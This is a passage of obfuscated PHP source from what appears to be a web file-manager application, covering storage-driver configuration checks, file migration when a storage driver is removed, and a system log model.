json_decode($Èâ²“î›, !0); if (!$Èâ²“î›) { return; } if ($Èâ²“î›[$Ïç°¼°[1944]] != $Ïç°¼°[91]) { return; } $õôİŒÍƒ = $Èâ²“î›[$Ïç°¼°[861]]; if ($Èâ²“î›[$Ïç°¼°[168]] != $Ïç°¼°[1304]) { if ($õôİŒÍƒ != $¡ŸôÚò±) { return; } $Èâ²“î›[$Ïç°¼°[168]] = $Ïç°¼°[1304]; } else { if ($õôİŒÍƒ == $¡ŸôÚò±) { return; } $Èâ²“î›[$Ïç°¼°[861]] = $¡ŸôÚò±; } Model($Ïç°¼°[882])->set(array($Ïç°¼°[888] => $Èâ²“î›)); } public function checkPwd($îÃ„Ìİ«, &$¦¾ÚÀşá) { $ğ‰ ‰ø =& $_SERVER[œ—üé‹ê]; if (empty($¦¾ÚÀşá[$ğ‰ ‰ø[6]])) { return; } $•È¼úÜ› = $¦¾ÚÀşá[$ğ‰ ‰ø[6]]; if (!is_array($•È¼úÜ›)) { $•È¼úÜ› = json_decode($•È¼úÜ›, !0); } $ï­Ç·‡ü = $ğ‰ ‰ø[12]; $£ŸúæÕØ = array($ğ‰ ‰ø[1638], $ğ‰ ‰ø[2513], $ğ‰ ‰ø[1053]); foreach ($£ŸúæÕØ as $œ¸ö£ÚÚ) { if (isset($•È¼úÜ›[$œ¸ö£ÚÚ])) { $ï­Ç·‡ü = $œ¸ö£ÚÚ; break; } } if (!$ï­Ç·‡ü) { return; } $àŠºº´ = $this->getConfig($îÃ„Ìİ«); $®€•êÑ = $àŠºº´[$ï­Ç·‡ü]; $ØÌÇÂ´ = $•È¼úÜ›[$ï­Ç·‡ü]; if ($ØÌÇÂ´ == str_repeat($ğ‰ ‰ø[220], strlen($®€•êÑ))) { $•È¼úÜ›[$ï­Ç·‡ü] = $®€•êÑ; $¦¾ÚÀşá[$ğ‰ ‰ø[6]] = json_encode($•È¼úÜ›); } else { if ($ØÌÇÂ´ != $®€•êÑ) { $¦¾ÚÀşá[$ğ‰ ‰ø[2512]] = $ğ‰ ‰ø[91]; } } } public function checkConfig(&$¦ß£ıÈ–, $ºÑ‡üÈ¢ = false) { $¾öÎôË =& $_SERVER[œ—üé‹ê]; $«Ç¾³â° = strtolower($¦ß£ıÈ–[$¾öÎôË[96]]); $‹¼‰ôŒ­ = $¦ß£ıÈ–[$¾öÎôË[6]]; if (!is_array($‹¼‰ôŒ­)) { $‹¼‰ôŒ­ = json_decode($‹¼‰ôŒ­, !0); } foreach ($‹¼‰ôŒ­ as $Ä¥“¸Ó => $Å¦óİ¦¬) { if (is_string($Å¦óİ¦¬)) { $‹¼‰ôŒ­[$Ä¥“¸Ó] = trim($Å¦óİ¦¬); } } $‹¼‰ôŒ­[$¾öÎôË[2514]] = rand_string(6); $‚ÎÌù˜ß = $GLOBALS[$¾öÎôË[6]][$¾öÎôË[92]][$¾öÎôË[943]]; $”Âë•Ÿ = isset($‚ÎÌù˜ß[$«Ç¾³â°]) ? $‚ÎÌù˜ß[$«Ç¾³â°] : ucfirst($«Ç¾³â°); $İ”†ıÄˆ = $¾öÎôË[77] . $”Âë•Ÿ; if (!$”Âë•Ÿ || !class_exists($İ”†ıÄˆ)) { if ($ºÑ‡üÈ¢) { return LNG($¾öÎôË[2515]); } write_log(array($¾öÎôË[2516], $¦ß£ıÈ–, get_caller_info()), $¾öÎôË[213]); show_json(LNG($¾öÎôË[2515]), !1, $¦ß£ıÈ–); } $ôÕğÏÏ = new $İ”†ıÄˆ($‹¼‰ôŒ­); $ìˆóïÏµ = rtrim($‹¼‰ôŒ­[$¾öÎôË[1365]], $¾öÎôË[8]) . $¾öÎôË[8]; if (in_array($«Ç¾³â°, $ôÕğÏÏ->objectDriver)) { try { if (!$ôÕğÏÏ->isBucketCors() && !$ôÕğÏÏ->setBucketCors()) { $ÀƒÍĞ¡Á = LNG($¾öÎôË[2517]); $ÀƒÍĞ¡Á .= $¾öÎôË[2518] . LNG($¾öÎôË[2519]); } } catch (Exception $Ï´Ù¾ğÄ) { $ÀƒÍĞ¡Á = $Ï´Ù¾ğÄ->getMessage(); } if (isset($ÀƒÍĞ¡Á)) { return $this->_parseError($ÀƒÍĞ¡Á, $«Ç¾³â°, $ºÑ‡üÈ¢); } if ($«Ç¾³â° == $¾öÎôË[68]) { $××§„ = $ôÕğÏÏ->getBktRegion(); if ($××§„ != $‹¼‰ôŒ­[$¾öÎôË[2520]]) { $‹¼‰ôŒ­[$¾öÎôË[2520]] = $××§„; $ôÕğÏÏ->setRegion($××§„); } } } else { if ($«Ç¾³â° == $¾öÎôË[2521]) { if ($ôÕğÏÏ->ftpPath) { $ª­í¡ÍÄ = trim($ìˆóïÏµ, $¾öÎôË[8]); if (stripos($ª­í¡ÍÄ, trim($ôÕğÏÏ->ftpPath, $¾öÎôË[8])) !== 0) { $ìˆóïÏµ = $ôÕğÏÏ->ftpPath . $¾öÎôË[8] . ($ª­í¡ÍÄ ? $ª­í¡ÍÄ . $¾öÎôË[8] : $¾öÎôË[12]); } } } } $ÙØéØ°¬ = $ôÕğÏÏ->getPath($ìˆóïÏµ . $¾öÎôË[1369]); try { if ($«Ç¾³â° == $¾öÎôË[106]) { $ôÕğÏÏ->mkdir($ìˆóïÏµ, REPEAT_SKIP); } $–şÊ¦ˆ = $ôÕğÏÏ->mkfile($ÙØéØ°¬, $¾öÎôË[12], REPEAT_REPLACE); if (!$–şÊ¦ˆ) { $ÀƒÍĞ¡Á = LNG($¾öÎôË[2517]); } } catch (Exception $Ï´Ù¾ğÄ) { $ÀƒÍĞ¡Á = $Ï´Ù¾ğÄ->getMessage(); } if (isset($ÀƒÍĞ¡Á)) { return $this->_parseError($ÀƒÍĞ¡Á, $«Ç¾³â°, $ºÑ‡üÈ¢); } $‹¼‰ôŒ­[$¾öÎôË[1365]] = $ìˆóïÏµ; $¦ß£ıÈ–[$¾öÎôË[6]] = json_encode($‹¼‰ôŒ­); $¦ß£ıÈ–[$¾öÎôË[96]] = $”Âë•Ÿ; return !0; } private function _parseError($ğßîØª¨, $Ñ•Í´öÒ, $¬Ÿ™ôğ¿ = false) { $ê€Ô‚Š» =& $_SERVER[œ—üé‹ê]; if ($Ñ•Í´öÒ == $ê€Ô‚Š»[68] && stripos($ğßîØª¨, $ê€Ô‚Š»[2522])) { $î¤¤•Ï± = explode($ê€Ô‚Š»[10], $ğßîØª¨); $ÌÃ§íÆ¹ = isset($î¤¤•Ï±[1]) ? $î¤¤•Ï±[1] : $ê€Ô‚Š»[12]; $Àç¶ì¦¥ = array($ê€Ô‚Š»[2523] => LNG($ê€Ô‚Š»[2524]), $ê€Ô‚Š»[2525] => LNG($ê€Ô‚Š»[2526])); if (isset($Àç¶ì¦¥[$ÌÃ§íÆ¹])) { $ğßîØª¨ = $Àç¶ì¦¥[$ÌÃ§íÆ¹]; } } if (stripos($ğßîØª¨, $ê€Ô‚Š»[2527]) === 0) { $èµ÷Ã£İ = strpos($ğßîØª¨, $ê€Ô‚Š»[175]); if ($èµ÷Ã£İ === !1) { $èµ÷Ã£İ = strpos($ğßîØª¨, $ê€Ô‚Š»[4]); } if ($èµ÷Ã£İ !== !1) { $ğßîØª¨ = substr($ğßîØª¨, $èµ÷Ã£İ + 1); } } $ğßîØª¨ = LNG($ê€Ô‚Š»[1372]) . $ğßîØª¨; if ($¬Ÿ™ôğ¿) { return $ğßîØª¨; } show_json($ğßîØª¨, !1); } public function driverListSystem() { $ø¼›üğ¹ =& $_SERVER[œ—üé‹ê]; $Ø¬èĞ„ñ = parent::listData(); $Ç Ô¶Êƒ = array(); foreach ($Ø¬èĞ„ñ as $Âôµ¨Íú) { unset($Âôµ¨Íú[$ø¼›üğ¹[231]], $Âôµ¨Íú[$ø¼›üğ¹[88]]); if (!is_array($Âôµ¨Íú[$ø¼›üğ¹[6]])) { $Âôµ¨Íú[$ø¼›üğ¹[6]] = json_decode($Âôµ¨Íú[$ø¼›üğ¹[6]], !0); } $Ç Ô¶Êƒ[] = $Âôµ¨Íú; } return $Ç Ô¶Êƒ; } public function defaultDriver() { $šœØ¿–ã =& $_SERVER[œ—üé‹ê]; $ÛÀåªßœ = parent::listData(); $ûÑá¾¹ = array_filter_by_field($ÛÀåªßœ, $šœØ¿–ã[37], 1); $ûÑá¾¹ = $ûÑá¾¹[0]; if (!$ûÑá¾¹) { return array(); } if (!is_array($ûÑá¾¹[$šœØ¿–ã[6]])) { $ûÑá¾¹[$šœØ¿–ã[6]] = json_decode($ûÑá¾¹[$šœØ¿–ã[6]], !0); } return $ûÑá¾¹; } public function driverInfo($Áˆœ­‚ò) { $Î¿ËåÁ =& $_SERVER[œ—üé‹ê]; $¿öğâÌô = array_to_keyvalue(parent::listData(), $Î¿ËåÁ[487]); if (!isset($¿öğâÌô[$Áˆœ­‚ò])) { return !1; } $ôÅ‚Ó« = $¿öğâÌô[$Áˆœ­‚ò]; if (!is_array($ôÅ‚Ó«[$Î¿ËåÁ[6]])) { $ôÅ‚Ó«[$Î¿ËåÁ[6]] = json_decode($ôÅ‚Ó«[$Î¿ËåÁ[6]], !0); } return $ôÅ‚Ó«; } public function remove($×¾²†œ) { $this->removeShareItems($×¾²†œ); return parent::remove($×¾²†œ); } public function removeWithFile($»ğŒìŸû, $ÖãŠ„½Ï, $±Í“´Ñ×, $˜¬Ëç = false) { $§Âœü  =& $_SERVER[œ—üé‹ê]; ignore_timeout(); $‡·‡§® = array($§Âœü [935] => $»ğŒìŸû); $ùŒ©Ï¹Ù = Model($§Âœü [560]); if (isset($GLOBALS[$§Âœü [2528]])) { $òÍÀÀ•© = $GLOBALS[$§Âœü [2528]]; } else { $òÍÀÀ•© = $ùŒ©Ï¹Ù->where($‡·‡§®)->field(array($§Âœü [958] => $§Âœü [959], $§Âœü [960] => $§Âœü [79]))->find(); } $‘Ú­şÒ = intval($òÍÀÀ•©[$§Âœü [959]]); $ÅìšõÖĞ = intval($òÍÀÀ•©[$§Âœü [79]]); $ûØŸÛ™ = $ÖãŠ„½Ï . $§Âœü [2529] . $»ğŒìŸû; $ĞÄ„Å‰ = LNG($ÖãŠ„½Ï == $§Âœü [643] ? $§Âœü [2530] : $§Âœü [2531]); $™ŠÁğ³× = new TaskFileTransfer($ûØŸÛ™, $§Âœü [213], $‘Ú­şÒ, $ĞÄ„Å‰ . $§Âœü [476] . $±Í“´Ñ×[$§Âœü [32]] . $§Âœü [212] . $»ğŒìŸû); $™ŠÁğ³×->task[$§Âœü [873]] = (double) $ÅìšõÖĞ; $Œ²®ß”Ì = KodIO::defaultDriver(); $©÷‘õ¼– = $Œ²®ß”Ì[$§Âœü [487]]; $Ú³ò±¬ë = 1; $¾ô¢‘¯¥ = 5000; $Ê—¨â“ = $‰•ÇÑğ” = $÷±ïü›Á = array(); $ù¿Ê¬ = $ùŒ©Ï¹Ù->where($‡·‡§®)->field($§Âœü [2532])->selectPage($¾ô¢‘¯¥, $Ú³ò±¬ë); $ëÅÙòõ = intval($ù¿Ê¬[$§Âœü [443]][$§Âœü [445]]); while ($ù¿Ê¬ && $Ú³ò±¬ë <= $ëÅÙòõ) { foreach ($ù¿Ê¬[$§Âœü [446]] as $ßŠŸ§éê) { $ûÏİ’œ = $ßŠŸ§éê[$§Âœü [557]]; if ($˜¬Ëç) { $‰•ÇÑğ”[] = $ûÏİ’œ; continue; } $Ó¦ãØ = $ßŠŸ§éê[$§Âœü [87]]; $’¡­­ÃÍ = rtrim(get_path_father($Ó¦ãØ), $§Âœü [8]) . $§Âœü [8]; $÷±ïü›Á[] = $’¡­­ÃÍ; $’¡­­ÃÍ = str_replace("\173\151\157\x3a{$»ğŒìŸû}\x7d\57", "\x7b\x69\157\x3a{$©÷‘õ¼–}\x7d\57", $’¡­­ÃÍ); if (!IO::exist($Ó¦ãØ) || !IO::isFile($Ó¦ãØ)) { $Ê—¨â“[] = $ûÏİ’œ; $™ŠÁğ³×->updateFileEnd($ßŠŸ§éê[$§Âœü [32]], $ßŠŸ§éê[$§Âœü [79]]); write_log($§Âœü [2533] . $Ó¦ãØ, $§Âœü [2114]); continue; } $¢ì›ìğ½ = IO::move($Ó¦ãØ, $’¡­­ÃÍ, REPEAT_RENAME); if (!$¢ì›ìğ½) { $‰•ÇÑğ”[] = $ûÏİ’œ; $™ŠÁğ³×->updateFileEnd($ßŠŸ§éê[$§Âœü [32]], $ßŠŸ§éê[$§Âœü [79]]); write_log($§Âœü [2534] . $Ó¦ãØ, $§Âœü [2114]); continue; } $§ˆàôÇ› = array($§Âœü [935] => $©÷‘õ¼–, $§Âœü [87] => $¢ì›ìğ½); $ùŒ©Ï¹Ù->where(array($§Âœü [557] => $ûÏİ’œ))->save($§ˆàôÇ›); } $Ú³ò±¬ë++; $ù¿Ê¬ = $ùŒ©Ï¹Ù->where($‡·‡§®)->field($§Âœü [2532])->selectPage($¾ô¢‘¯¥, $Ú³ò±¬ë); } $Ê‹Äï¤Ù = $™ŠÁğ³×->task; if (!$˜¬Ëç) { Cache::set($ûØŸÛ™, $Ê‹Äï¤Ù); } $™ŠÁğ³×->end(); $Ê—¨â“ = array_unique($Ê—¨â“); $‰•ÇÑğ” = array_unique($‰•ÇÑğ”); if (!$˜¬Ëç && ($Ê—¨â“ || $‰•ÇÑğ”)) { $«• ‚“ = array(); if ($Ê—¨â“) { $«• ‚“[] = sprintf(LNG($§Âœü [2535]), count($Ê—¨â“)); } if ($‰•ÇÑğ”) { $«• ‚“[] = sprintf(LNG($§Âœü [2536]), count($‰•ÇÑğ”)); } $«• ‚“ = sprintf(LNG($§Âœü [2537]), implode($§Âœü [1583], $«• ‚“)) . $§Âœü [2538] . date($§Âœü [2539]) . $§Âœü [2540]; if ($ÖãŠ„½Ï == $§Âœü [1330]) { $«• ‚“ .= $§Âœü [2541] . LNG($§Âœü [2542]); } else { $«• ‚“ = LNG($§Âœü [2543]) . $§Âœü [2544] . $«• ‚“; } $Ê‹Äï¤Ù[$§Âœü [1367]] = $«• ‚“; Cache::set($ûØŸÛ™, $Ê‹Äï¤Ù); unset($±Í“´Ñ×[$§Âœü [6]]); $˜´Ö‚Ÿš = array($§Âœü [487] => $»ğŒìŸû, $§Âœü [2419] => $§Âœü [643], $§Âœü [32] => $±Í“´Ñ×[$§Âœü [32]], $§Âœü [96] => $±Í“´Ñ×[$§Âœü [96]]); Hook::trigger($§Âœü [1984], array($§Âœü [1388] => $˜´Ö‚Ÿš, $§Âœü [1398] => !0)); show_json($«• ‚“, !1, 100111); } if ($ÖãŠ„½Ï == $§Âœü [643]) { return !0; } if ($Ê—¨â“ || $‰•ÇÑğ”) { $€Ş¼±è» = array_merge($Ê—¨â“, $‰•ÇÑğ”); $€Ş¼±è» = array_filter(array_unique($€Ş¼±è»)); $this->removeByFileID($€Ş¼±è»); } if ($÷±ïü›Á) { $÷±ïü›Á = array_filter(array_unique($÷±ïü›Á)); foreach ($÷±ïü›Á as $Ó¦ãØ) { $òÍÀÀ•© = IO::has($Ó¦ãØ, !0); if (!$òÍÀÀ•©[$§Âœü [239]] && !$òÍÀÀ•©[$§Âœü [240]]) { IO::remove($Ó¦ãØ); } } } return $this->remove($»ğŒìŸû); } private function removeByFileID($ù´†·”± = array()) { $‘ìß¨ ä =& $_SERVER[œ—üé‹ê]; if (empty($ù´†·”±)) { return; } $ô›šªÀ³ = array($‘ìß¨ ä[557] => array($‘ìß¨ ä[7], $ù´†·”±)); $çËàµ… = Model($‘ìß¨ ä[1530])->where($ô›šªÀ³)->field($‘ìß¨ ä[2491])->select(); if (!$çËàµ…) { return Model($‘ìß¨ ä[560])->remove($ù´†·”±); } $çËàµ… = array_to_keyvalue($çËàµ…, $‘ìß¨ ä[191], $‘ìß¨ ä[557]); foreach ($çËàµ… as $¹°‘ÉÌ => $²§¿ò„•) { Model($‘ìß¨ ä[942])->removeNow($¹°‘ÉÌ, !1); } $±îñÓ°ä = array_diff($ù´†·”±, array_unique(array_values($çËàµ…))); if ($±îñÓ°ä) { return Model($‘ìß¨ ä[560])->remove($±îñÓ°ä); } } private function removeShareItems($¿×Ëñ¤Ñ) { $–¿ áêÚ =& $_SERVER[œ—üé‹ê]; $¬òÚ‚İè = "\173\x69\x6f\x3a{$¿×Ëñ¤Ñ}\175\x2f"; $ÍÄË×µœ = array($–¿ áêÚ[191] => 0, $–¿ áêÚ[583] => array($–¿ áêÚ[473], "{$¬òÚ‚İè}\x25")); $ğÄÀõŒ = Model($–¿ áêÚ[1559])->where($ÍÄË×µœ)->field($–¿ áêÚ[687])->select(); if (empty($ğÄÀõŒ)) { return; } $ÌÇ­£ê« = array_to_keyvalue($ğÄÀõŒ, $–¿ áêÚ[12], $–¿ áêÚ[687]); Model($–¿ áêÚ[686])->remove($ÌÇ­£ê«); } } class SystemLightAppModel extends ModelBaseLight { public $optionType = "\123\x79\163\x74\x65\x6d\x2e\114\151\x67\x68\164\x41\160\x70"; public $modelType = "\123\x79\163\x74\145\x6d\117\x70\164\151\x6f\156"; public $field = array("\x6e\x61\x6d\145", "\x67\162\157\x75\160", "\144\145\163\x63", "\x63\x6f\x6e\x74\145\156\x74"); public function listData($€¨¸˜ç¯ = false, $ßÑë‚š• = "\x6d\x6f\x64\x69\146\x79\x54\x69\x6d\x65", $ğ§ËµÓõ = true) { return parent::listData($€¨¸˜ç¯, $ßÑë‚š•, $ğ§ËµÓõ); } public function remove($ÜŒ€ê¾ˆ) { $°İôÃÌø = $this->findByName($ÜŒ€ê¾ˆ); if (!$°İôÃÌø) { return !1; } return parent::remove($°İôÃÌø[$_SERVER[œ—üé‹ê][487]]); } public function add($•ıØûÒ) { if ($this->findByName($•ıØûÒ[$_SERVER[œ—üé‹ê][32]])) { return !1; } return parent::insert($•ıØûÒ); } public function update($ËÃ¹½­Õ, $… ñ‹¤¹) { $ö¸×¾ê =& $_SERVER[œ—üé‹ê]; $™ıáŒ = $this->findByName($ËÃ¹½­Õ); $âûÏÛı‹ = $this->findByName($… ñ‹¤¹[$ö¸×¾ê[32]]); if (!$™ıáŒ || $âûÏÛı‹ && $âûÏÛı‹[$ö¸×¾ê[487]] != $™ıáŒ[$ö¸×¾ê[487]]) { return !1; } return parent::update($™ıáŒ[$ö¸×¾ê[487]], $… ñ‹¤¹); } } class SystemLogModel extends ModelBase { protected $tableName = "\163\171\163\x74\145\x6d\x5f\x6c\x6f\x67"; protected $dataAuto = array(array("\x63\x72\x65\141\x74\145\x54\151\x6d\145", "\x74\x69\155\x65", "\151\156\163\x65\162\164", "\x66\x75\x6e\143\164\x69\157\x6e")); public $typeList; function __construct() { parent::__construct(); $this->typeList = $this->typeListAll(); } public function typeListAll() { $ÀÏıšğÔ =& $_SERVER[œ—üé‹ê]; return array($ÀÏıšğÔ[2545] => LNG($ÀÏıšğÔ[2546]), $ÀÏıšğÔ[2547] => LNG($ÀÏıšğÔ[2548]), $ÀÏıšğÔ[2125] => LNG($ÀÏıšğÔ[2549]), $ÀÏıšğÔ[2550] => LNG($ÀÏıšğÔ[2551]), $ÀÏıšğÔ[2552] => LNG($ÀÏıšğÔ[2553]), $ÀÏıšğÔ[2554] => LNG($ÀÏıšğÔ[2555]), $ÀÏıšğÔ[2556] => LNG($ÀÏıšğÔ[2557]), $ÀÏıšğÔ[2152] => LNG($ÀÏıšğÔ[2557]), $ÀÏıšğÔ[2153] => LNG($ÀÏıšğÔ[2558]), $ÀÏıšğÔ[2559] => LNG($ÀÏıšğÔ[2560]), $ÀÏıšğÔ[2561] => LNG($ÀÏıšğÔ[2562]), $ÀÏıšğÔ[2563] => LNG($ÀÏıšğÔ[2564]), $ÀÏıšğÔ[2565] => LNG($ÀÏıšğÔ[2566]), $ÀÏıšğÔ[2150] => LNG($ÀÏıšğÔ[2567]), $ÀÏıšğÔ[2568] => LNG($ÀÏıšğÔ[2569]), $ÀÏıšğÔ[2157] => LNG($ÀÏıšğÔ[2570]), $ÀÏıšğÔ[2571] => LNG($ÀÏıšğÔ[2572]), $ÀÏıšğÔ[2573] => LNG($ÀÏıšğÔ[2574]), $ÀÏıšğÔ[2575] => LNG($ÀÏıšğÔ[2576]), $ÀÏıšğÔ[2577] => LNG($ÀÏıšğÔ[2578]), $ÀÏıšğÔ[2159] => LNG($ÀÏıšğÔ[2579]), $ÀÏıšğÔ[2160] => LNG($ÀÏıšğÔ[2580]), $ÀÏıšğÔ[2581] => LNG($ÀÏıšğÔ[2582]), $ÀÏıšğÔ[2583] => LNG($ÀÏıšğÔ[2584]), $ÀÏıšğÔ[2585] => LNG($ÀÏıšğÔ[2586]), $ÀÏıšğÔ[2155] => LNG($ÀÏıšğÔ[2587]), $ÀÏıšğÔ[2588] => LNG($ÀÏıšğÔ[2589]), $ÀÏıšğÔ[2154] => LNG($ÀÏıšğÔ[2590]), $ÀÏıšğÔ[2591] => LNG($ÀÏıšğÔ[2591]), $ÀÏıšğÔ[2592] => LNG($ÀÏıšğÔ[2593]), $ÀÏıšğÔ[2594] => LNG($ÀÏıšğÔ[2591]), $ÀÏıšğÔ[2595] => LNG($ÀÏıšğÔ[2596]), $ÀÏıšğÔ[2597] => LNG($ÀÏıšğÔ[2598]), $ÀÏıšğÔ[2599] => LNG($ÀÏıšğÔ[2598]), $ÀÏıšğÔ[2600] => LNG($ÀÏıšğÔ[2601]), $ÀÏıšğÔ[2602] => LNG($ÀÏıšğÔ[2602]), $ÀÏıšğÔ[2603] => LNG($ÀÏıšğÔ[2129]), $ÀÏıšğÔ[2604] => LNG($ÀÏıšğÔ[2605]), $ÀÏıšğÔ[2606] => LNG($ÀÏıšğÔ[2607]), $ÀÏıšğÔ[2608] => LNG($ÀÏıšğÔ[2609]), $ÀÏıšğÔ[2610] => LNG($ÀÏıšğÔ[2611]), $ÀÏıšğÔ[2612] => LNG($ÀÏıšğÔ[2613]), $ÀÏıšğÔ[2614] => LNG($ÀÏıšğÔ[2614]), $ÀÏıšğÔ[2615] => LNG($ÀÏıšğÔ[2616]), $ÀÏıšğÔ[2617] => LNG($ÀÏıšğÔ[2618]), $ÀÏıšğÔ[2619] => LNG($ÀÏıšğÔ[2620]), $ÀÏıšğÔ[2621] => LNG($ÀÏıšğÔ[2622]), $ÀÏıšğÔ[2623] => LNG($ÀÏıšğÔ[2624]), $ÀÏıšğÔ[2625] => LNG($ÀÏıšğÔ[2626]), $ÀÏıšğÔ[210] => LNG($ÀÏıšğÔ[210]), $ÀÏıšğÔ[211] => LNG($ÀÏıšğÔ[2627]), $ÀÏıšğÔ[2628] => LNG($ÀÏıšğÔ[2628])); } private function typeFile() { $€Éœé‡¤ =& $_SERVER[œ—üé‹ê]; $Âœ›†Á÷ = array($€Éœé‡¤[2157] => array($€Éœé‡¤[2158]), $€Éœé‡¤[2563] => array($€Éœé‡¤[2629]), $€Éœé‡¤[2565] => array($€Éœé‡¤[2630]), $€Éœé‡¤[2150] => array($€Éœé‡¤[2151], $€Éœé‡¤[2631]), $€Éœé‡¤[2573] => array(), $€Éœé‡¤[2575] => array(), $€Éœé‡¤[2577] => array(), $€Éœé‡¤[2159] => array($€Éœé‡¤[2161]), $€Éœé‡¤[2160] => array($€Éœé‡¤[2161]), $€Éœé‡¤[2581] => array($€Éœé‡¤[2632]), $€Éœé‡¤[2583] => array($€Éœé‡¤[2632]), $€Éœé‡¤[2585] => array($€Éœé‡¤[2633]), $€Éœé‡¤[2571] => array($€Éœé‡¤[2634]), $€Éœé‡¤[2155] => array($€Éœé‡¤[2635]), $€Éœé‡¤[2588] => array($€Éœé‡¤[2636]), $€Éœé‡¤[2154] => array($€Éœé‡¤[2156])); return $Âœ›†Á÷; } private function typeAll() { $É¼ÃÅµœ =& $_SERVER[œ—üé‹ê]; $Ûá‚Ï ½ = $this->typeList; $•§î”Òû = array_filter($this->typeFile()); foreach ($•§î”Òû as $Şğ¿®£ë => $¶°êœĞ¶) { $Ûá‚Ï ½[$¶°êœĞ¶[0]] = $Ûá‚Ï ½[$Şğ¿®£ë]; } $Ûá‚Ï ½[$É¼ÃÅµœ[2161]] = LNG($É¼ÃÅµœ[2637]); $Ûá‚Ï ½[$É¼ÃÅµœ[2632]] = LNG($É¼ÃÅµœ[2638]); return $Ûá‚Ï ½; } public function addLog($ì¯İ˜€, $Â¬¡˜óê = array()) { $ªÚëĞ¦û =& $_SERVER[œ—üé‹ê]; if (!isset($this->typeList[$ì¯İ˜€])) { return; } $„ô‚Ï©Ó = Session::get($ªÚëĞ¦û[2317]); if (!$„ô‚Ï©Ó) { $„ô‚Ï©Ó = _get($Â¬¡˜óê, $ªÚëĞ¦û[1589], 0); } if ($ì¯İ˜€ == $ªÚëĞ¦û[2604] && is_array($Â¬¡˜óê[$ªÚëĞ¦û[2639]]) && !$Â¬¡˜óê[$ªÚëĞ¦û[2639]]) { return; } $¡´‹Õ­ = get_client_ip(); if (!$Â¬¡˜óê || strlen(json_encode($Â¬¡˜óê)) >= 1024 * 64) { if ($Â¬¡˜óê && is_array($Â¬¡˜óê)) { $Â¬¡˜óê = array_intersect_key($Â¬¡˜óê, array_flip($ªÚëĞ¦û[487], $ªÚëĞ¦û[32])); $Â¬¡˜óê[$ªÚëĞ¦û[1605]] = $¡´‹Õ­; } else { $Â¬¡˜óê = array($ªÚëĞ¦û[1605] => $¡´‹Õ­); } } else { if (is_array($Â¬¡˜óê)) { $Â¬¡˜óê[$ªÚëĞ¦û[1605]] = $¡´‹Õ­; } else { $Â¬¡˜óê = array($ªÚëĞ¦û[1388] => $Â¬¡˜óê, $ªÚëĞ¦û[1605] => $¡´‹Õ­); } } $Â¬¡˜óê[$ªÚëĞ¦û[2640]] = ACTION; $Â¬¡˜óê = array($ªÚëĞ¦û[1964] => Session::sign(), $ªÚëĞ¦û[1965] => intval($„ô‚Ï©Ó), $ªÚëĞ¦û[33] => $ì¯İ˜€, $ªÚëĞ¦û[1967] => json_encode($Â¬¡˜óê)); Hook::trigger($ªÚëĞ¦û[2641], $Â¬¡˜óê); return parent::add($Â¬¡˜óê); } public function remove($™œ¾ˆ×) { $this->where(array($_SERVER[œ—üé‹ê][508] => $™œ¾ˆ×))->delete(); } private function _makeOrder($é¸àş = '') { $ô•Œ»°ğ =& $_SERVER[œ—üé‹ê]; $ã¹šõ¦Ô = $ô•Œ»°ğ[231]; $é½ª€äã = array($ô•Œ»°ğ[537] => $ô•Œ»°ğ[538], $ô•Œ»°ğ[539] => $ô•Œ»°ğ[540]); $¥Îµ¾€Ş = Input::get($ô•Œ»°ğ[545], $ô•Œ»°ğ[7], $ô•Œ»°ğ[2354], array($ô•Œ»°ğ[2273], $ô•Œ»°ğ[539])); $¥Îµ¾€Ş = $é½ª€äã[$¥Îµ¾€Ş]; $é¸àş = $é¸àş . "{$ã¹šõ¦Ô}\x20{$¥Îµ¾€Ş}"; return $this->order($é¸àş); } public function get($ß¢Ÿ”Ûš = '') { $ı‘à’ä =& $_SERVER[œ—üé‹ê]; if (!$ß¢Ÿ”Ûš) { show_json(array()); } $Á„’°«Ş = array(); if ($ß¢Ÿ”Ûš[$ı‘à’ä[1589]]) { $Á„’°«Ş[$ı‘à’ä[1589]] = $ß¢Ÿ”Ûš[$ı‘à’ä[1589]]; } if (isset($ß¢Ÿ”Ûš[$ı‘à’ä[870]])) { $Õåö¼–ú = $ß¢Ÿ”Ûš[$ı‘à’ä[870]]; $ÁÀŸçØŸ = isset($ß¢Ÿ”Ûš[$ı‘à’ä[871]]) ? $ß¢Ÿ”Ûš[$ı‘à’ä[871]] : time(); $Á„’°«Ş[$ı‘à’ä[231]] = array($ı‘à’ä[408], array($Õåö¼–ú, $ÁÀŸçØŸ)); } if ($ß¢Ÿ”Ûš[$ı‘à’ä[33]]) { $“ê¯³« = explode($ı‘à’ä[50], $ß¢Ÿ”Ûš[$ı‘à’ä[33]]); $‚Ş°Ö›â = $this->typeFile(); $³í§ûæõ = array(); foreach ($“ê¯³« as $ØüÒ¹ò) { $³í§ûæõ[] = $ØüÒ¹ò; if (isset($‚Ş°Ö›â[$ØüÒ¹ò])) { $³í§ûæõ = array_merge($³í§ûæõ, $‚Ş°Ö›â[$ØüÒ¹ò]); } } $³í§ûæõ = array_unique($³í§ûæõ); if ($³í§ûæõ) { $Á„’°«Ş[$ı‘à’ä[33]] = array($ı‘à’ä[7], $³í§ûæõ); } } else { $Á„’°«Ş[$ı‘à’ä[33]] = array($ı‘à’ä[2642], $ı‘à’ä[2643]); } if (!empty($ß¢Ÿ”Ûš[$ı‘à’ä[1605]])) { $Á„’°«Ş[$ı‘à’ä[540]] = array($ı‘à’ä[473], "\45{$ß¢Ÿ”Ûš[$ı‘à’ä[1605]]}\45"); } $µ£†Ñ‡ = $this->_makeOrder()->where($Á„’°«Ş)->selectPage(); if (empty($µ£†Ñ‡[$ı‘à’ä[446]])) { show_json(array(), !0, $µ£†Ñ‡[$ı‘à’ä[443]]); } $µ£†Ñ‡[$ı‘à’ä[446]] = $this->logList($µ£†Ñ‡[$ı‘à’ä[446]]); return $µ£†Ñ‡; } private function ipAddress(&$êÁì˜÷¸) { $Ïõ¡³…µ =& $_SERVER[œ—üé‹ê]; if (!empty($êÁì˜÷¸[$Ïõ¡³…µ[1605]])) { $µñ”³Ïë = IpLocation::get($êÁì˜÷¸[$Ïõ¡³…µ[1605]]); } else { $µñ”³Ïë = LNG($Ïõ¡³…µ[2644]); } $êÁì˜÷¸[$Ïõ¡³…µ[2645]] = $µñ”³Ïë; } private function descZipDownload($ğ›¬¨£˜, &$÷Ú”µ¹») { $êÕÃöÉÎ =& $_SERVER[œ—üé‹ê]; if (!isset($ğ›¬¨£˜[$êÕÃöÉÎ[1612]])) { return; } $±¬Ğêè… = json_decode($ğ›¬¨£˜[$êÕÃöÉÎ[1612]], !0); foreach ($±¬Ğêè… as $œÉìÅİ¤) { try { $üµ–è²è = 